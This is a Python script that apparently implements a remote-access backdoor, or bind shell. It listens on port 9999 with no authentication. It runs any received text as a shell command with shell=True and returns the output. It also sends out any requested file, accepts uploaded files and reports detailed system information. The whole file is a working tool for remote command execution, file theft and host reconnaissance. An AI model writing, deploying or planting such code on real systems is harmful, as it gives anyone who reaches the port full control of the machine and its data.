#importing required modules
import socket
import sys
import subprocess
import os
import time
import psutil
import platform
from datetime import datetime
import cpuinfo
import socket

#create a socket
def create_socket():
    try:
        #global variable so that we can access these variables in other functions
        global host
        global port
        global s
        host=''
        port=9999
        s = socket.socket()

    except socket.error as error_messsage:
        print("Error creating socket: " + str(error_messsage))
        sys.exit()

#bind the socket to the port and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the port: " + str(port))
        s.bind((host,port))
        s.listen(3) #listen for 3 connections at once (max)

    except socket.error as error_messsage:
        print("Error binding the port: " + str(error_messsage) + "\n" + "Retrying...")
        bind_socket() #call the function again to try binding again

#accept a connection with a server when socket is listening
def accept_connection():
    connection, address = s.accept()
    print("Connection has been established! | " + "IP " + address[0] + " | Port " + str(address[1]))
    currentWD = os.getcwd() + "> "
    connection.send(str.encode( currentWD))
    #do something with the connection
    check_commands(connection)
    
#execute commands sent by the server
def check_commands(connection):
    while(True):
        data = connection.recv(1024)
        data = data.decode('utf-8')
        if "send" in ''.join(data[:5]).lower():
            receive_file_from_client(data,connection)
        elif "receive" in ''.join(data[:9]).lower():
            send_file_to_client(data,connection)
        elif "sysinfo" in ''.join(data[:9]).lower():
            send_syteminfo_from_server(data,connection)
        elif "exit" in ''.join(data[:5]).lower():
            print("Closing connection...")
            connection.close()
            sys.exit()
            break
        else:
            execute_command(data,connection)

# send system information to client
def send_syteminfo_from_server(command,connection):
    # convert given bytes into proper format
    def get_size(bytes, suffix="B"):
        """
        Scale bytes to its proper format
        e.g:
            1253656 => '1.20MB'
            1253656678 => '1.17GB'
        """
        factor = 1024
        for unit in ["", "K", "M", "G", "T", "P"]:
            if bytes < factor:
                return f"{bytes:.2f}{unit}{suffix}"
            bytes /= factor

    info = ''
    
    info+="="*40+ "System Information"+ "="*40+"\n"
    uname = platform.uname()
    info+=f"System: {uname.system}"+"\n"
    info+=f"Node Name: {uname.node}"+"\n"
    info+=f"Release: {uname.release}"+"\n"
    info+=f"Version: {uname.version}"+"\n"
    info+=f"Machine: {uname.machine}"+"\n"
    info+=f"Processor: {uname.processor}"+"\n"

    info+=f"Processor: {cpuinfo.get_cpu_info()['brand_raw']}"+"\n"

    info+=f"Ip-Address: {socket.gethostbyname(socket.gethostname())}"+"\n"
    #info+=f"Mac-Address: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}"+"\n"


    # Boot Time
    info+="="*40+ "Boot Time"+ "="*40 +"\n"
    boot_time_timestamp = psutil.boot_time()
    bt = datetime.fromtimestamp(boot_time_timestamp)
    info+=f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}"+"\n"


    # print CPU information
    info+="="*40+ "CPU Info"+ "="*40 +"\n"
    # number of cores
    info+=f"Physical cores: {psutil.cpu_count(logical=False)}" +"\n"
    info+=f"Total cores: {psutil.cpu_count(logical=True)}" +"\n"

    # CPU frequencies
    cpufreq = psutil.cpu_freq()
    info+=f"Max Frequency: {cpufreq.max:.2f}Mhz"+"\n"
    info+=f"Min Frequency: {cpufreq.min:.2f}Mhz"+"\n"
    info+=f"Current Frequency: {cpufreq.current:.2f}Mhz"+"\n"
    # CPU usage

    info+="CPU Usage Per Core:"+"\n"
    for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
        info+=f"Core {i}: {percentage}%"+"\n"
    info+=f"Total CPU Usage: {psutil.cpu_percent()}%"+"\n"


    # Memory Information
    info+="="*40+ "Memory Information"+ "="*40 +"\n"
    # get the memory details
    svmem = psutil.virtual_memory()
    info+=f"Total: {get_size(svmem.total)}"+"\n"
    info+=f"Available: {get_size(svmem.available)}"+"\n"
    info+=f"Used: {get_size(svmem.used)}"+"\n"
    info+=f"Percentage: {svmem.percent}%"+"\n"



    info+="="*20+ "SWAP"+ "="*20 +"\n"
    # get the swap memory details (if exists)
    swap = psutil.swap_memory()
    info+=f"Total: {get_size(swap.total)}"+"\n"
    info+=f"Free: {get_size(swap.free)}"+"\n"
    info+=f"Used: {get_size(swap.used)}"+"\n"
    info+=f"Percentage: {swap.percent}%"+"\n"



    # Disk Information
    info+="="*40+ "Disk Information"+ "="*40 +"\n"
    info+="Partitions and Usage:"+"\n"
    # get all disk partitions
    partitions = psutil.disk_partitions()
    for partition in partitions:
        info+=f"=== Device: {partition.device} ==="+"\n"
        info+=f"  Mountpoint: {partition.mountpoint}"+"\n"
        info+=f"  File system type: {partition.fstype}"+"\n"
        try:
            partition_usage = psutil.disk_usage(partition.mountpoint)
        except PermissionError:
            # this can be catched due to the disk that
            # isn't ready
            continue
        info+=f"  Total Size: {get_size(partition_usage.total)}"+"\n"
        info+=f"  Used: {get_size(partition_usage.used)}"+"\n"
        info+=f"  Free: {get_size(partition_usage.free)}"+"\n"
        info+=f"  Percentage: {partition_usage.percent}%"+"\n"
    # get IO statistics since boot
    disk_io = psutil.disk_io_counters()
    info+=f"Total read since boot: {get_size(disk_io.read_bytes)}"+"\n"
    info+=f"Total write since boot: {get_size(disk_io.write_bytes)}"+"\n"


    ##get IO statistics since boot
    info+="="*40+ "IO statistics since boot"+ "="*40 +"\n"

    net_io = psutil.net_io_counters()
    info+=f"Total Bytes Sent: {get_size(net_io.bytes_sent)}"+"\n"
    info+=f"Total Bytes Received: {get_size(net_io.bytes_recv)}"+"\n"

    connection.send(str.encode(info))
    return None

#execute command received by the client
def execute_command(command,connection):
    if command.lower()=="close":
        connection.close()
        
    if command[:2] == 'cd':
            os.chdir(os.path.abspath(command[3:]))
            output_str = "Command Exectuted Successfully." + '\n'
            currentWD = os.getcwd() + "> " 
            connection.send(str.encode( currentWD + output_str ))

    elif len(command) > 0:
        cmd = subprocess.Popen(command[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read() # output and error messages
        output_str = str(output_byte,"utf-8") or "Command Exectuted Successfully."
        currentWD = os.getcwd() + "> " 
        connection.send(str.encode( currentWD + output_str ))
        #print(output_str)
    check_commands(connection)


#send file to client that is asked to received
def send_file_to_client(command,connection):
    file_info_list = command.strip(' ') # remove trailing spaces
    file_info_list = list(map(str,file_info_list.split()))
    file_path = file_info_list[1] # 0th element is the command, 1st element is the file path
    if os.path.isfile(file_path):
        
        file_size = os.path.getsize(file_path)
        connection.send(str.encode(str(file_size)))
        # Opening file and sending data.
        with open(file_path, "rb") as file:
            c = 0
            # Starting the time capture.
            start_time = time.time()

            # Running loop while c != file_size.
            print("Sending file...")
            while c <= file_size:
                data = file.read(1024)
                if not (data):
                    break
                connection.sendall(data)
                c += len(data)

            # Ending the time capture.
            end_time = time.time()

        print("File succesfully sended to client. Total time to transfer: ", end_time - start_time)
    else:
        print ("File path does not exist")
        connection.send(str.encode("0"))
    return None



#receive file from client
def receive_file_from_client(command,connection):
    file_info_list = command.strip(' ') # remove trailing spaces
    file_info_list = list(map(str,file_info_list.split()))
    file_name = file_info_list[2] or "temp" # 0th element is the command, 2nd element is the file name
    file_path = "./res/" + file_name
    os.makedirs(os.path.dirname(file_path), exist_ok=True)

    # Getting file details.
    file_size = connection.recv(100).decode()
    
    # Opening and reading file.
    with open( file_path, "wb") as file:
        c = 0
        # Starting the time capture.
        print("Receiving file...")
        start_time = time.time()

        # Running the loop while file is recieved.
        while c < int(file_size):
            data = connection.recv(1024)
            if not (data):
                break
            file.write(data)
            c += len(data)

        # Ending the time capture.
        end_time = time.time()
    

    print("File received from client. Total time: ", end_time - start_time)
    return None




def main():
    create_socket()
    bind_socket()
    accept_connection()


if __name__ == '__main__':
    main()